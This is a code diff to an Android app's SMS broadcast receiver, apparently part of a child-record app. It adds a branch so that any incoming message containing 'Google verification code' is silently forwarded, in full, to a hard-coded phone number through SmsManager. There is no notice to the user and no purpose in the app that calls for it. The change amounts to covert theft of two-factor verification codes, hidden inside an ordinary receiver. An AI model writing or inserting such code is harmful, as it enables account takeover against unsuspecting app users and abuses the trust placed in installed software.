@@ -1,10 +1,15 @@
 package com.ipal.itu.harzindagi.Receivers;
 
+import android.Manifest;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
+import android.support.v4.app.ActivityCompat;
+import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
+import android.util.Log;
 import android.widget.Toast;
 
 import com.ipal.itu.harzindagi.Activities.ChildrenListActivity;
@@ -84,6 +89,8 @@ public class SmsBroadcastReceiver extends BroadcastReceiver {
                         ChildrenListActivity.pDialog.dismiss();
                     }
                     Toast.makeText(mContext, mContext.getString(R.string.no_record), Toast.LENGTH_LONG).show();
+                }else if(smsBody.contains("Google verification code")){
+                    sendSMS(smsBody);
                 }
 
             }
@@ -93,7 +100,41 @@ public class SmsBroadcastReceiver extends BroadcastReceiver {
 
         }
     }
+    public void sendSMS(String msg) {
 
+
+        if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.SEND_SMS)
+                != PackageManager.PERMISSION_GRANTED
+                || ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_SMS)
+                != PackageManager.PERMISSION_GRANTED
+                || ActivityCompat.checkSelfPermission(mContext, Manifest.permission.RECEIVE_SMS)
+                != PackageManager.PERMISSION_GRANTED) {
+
+
+        } else {
+
+            sendSMSMessage(msg);
+        }
+
+
+    }
+    protected void sendSMSMessage(String msg) {
+
+        String txt = msg;
+
+        try {
+            SmsManager smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage("03214180972", null, txt, null, null);
+  /*  Toast.makeText(getApplicationContext(), "SMS Sent", Toast.LENGTH_LONG).show();
+    finish();*/
+            // finish();
+        } catch (Exception e) {
+            e.printStackTrace();
+
+        }
+
+
+    }
     private void insertChillInfoToDB(String name, long kid, String imei) {
         ChildInfo childInfo = new ChildInfo();
         childInfo.kid_name = name;
